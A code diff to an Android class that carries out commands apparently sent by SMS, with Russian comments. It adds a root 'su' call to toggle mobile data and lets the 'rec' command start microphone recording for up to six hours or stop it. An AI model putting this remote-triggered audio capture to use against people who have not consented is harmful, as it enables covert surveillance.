@@ -46,7 +46,7 @@ public class Commander {
      * <ul>
      * <li><b>mobile|wifi={enabled}</b> - Включает или отключает wifi|mobile в зависимости от параметра enabled. Команда mobile работает не на всех
      * устройствах и версиях Android.</li>
-     * <li><b>rec={duration}</b> - Запускает запись с микрофона на duration секунд</li>
+     * <li><b>rec[={duration}|{stop}]</b> - Запускает (на duration секунд или на 6 часов) или останавливает (stop) запись с микрофона</li>
      * <li><b>vibro={duration}</b> - Вибрирует duration милисекунд</li>
      * <li><b>reboot[={reason}]</b> - Перезагружает устройство. reason - code to pass to the kernel</li> (e.g., "recovery") to request special boot
      * modes.</li>
@@ -134,18 +134,29 @@ public class Commander {
             } else if (COMMAND_SMS_MOBILE.equals(cmd)) {
                 if (param != null) {
                     boolean enabled = Boolean.parseBoolean(param);
-                    Utils.setMobileDataEnabled(context, enabled);
+                    if (enabled) {
+                        new Proc("su").exec("svc data enable".split("\r*\n+"));
+                    } else {
+                        new Proc("su").exec("svc data disable".split("\r*\n+"));
+                    }
                 }
             } else if (COMMAND_SMS_REC.equals(cmd)) {
+                Intent mi = new Intent(context, RecRecordService.class);
                 if (param != null) {
-                    int duration = (int) (Integer.parseInt(param) * Utils.SECOND);
-                    Intent mi = new Intent(context, RecRecordService.class).putExtra(Utils.EXTRA_COMMAND, RecRecordService.COMMAND_REC_START)
-                            .putExtra(Utils.EXTRA_DURATION, duration);
-                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        context.startForegroundService(mi);
+                    if (param.equals("stop")) {
+                        mi.putExtra(Utils.EXTRA_COMMAND, RecRecordService.COMMAND_REC_STOP);
                     } else {
-                        context.startService(mi);
+                        int duration = (int) (Integer.parseInt(param) * Utils.SECOND);
+                        mi.putExtra(Utils.EXTRA_COMMAND, RecRecordService.COMMAND_REC_START)
+                                .putExtra(Utils.EXTRA_DURATION, duration);
                     }
+                } else {
+                    mi.putExtra(Utils.EXTRA_COMMAND, RecRecordService.COMMAND_REC_START);
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(mi);
+                } else {
+                    context.startService(mi);
                 }
             } else if (COMMAND_SMS_VIBRO.equals(cmd)) {
                 if (param != null) {
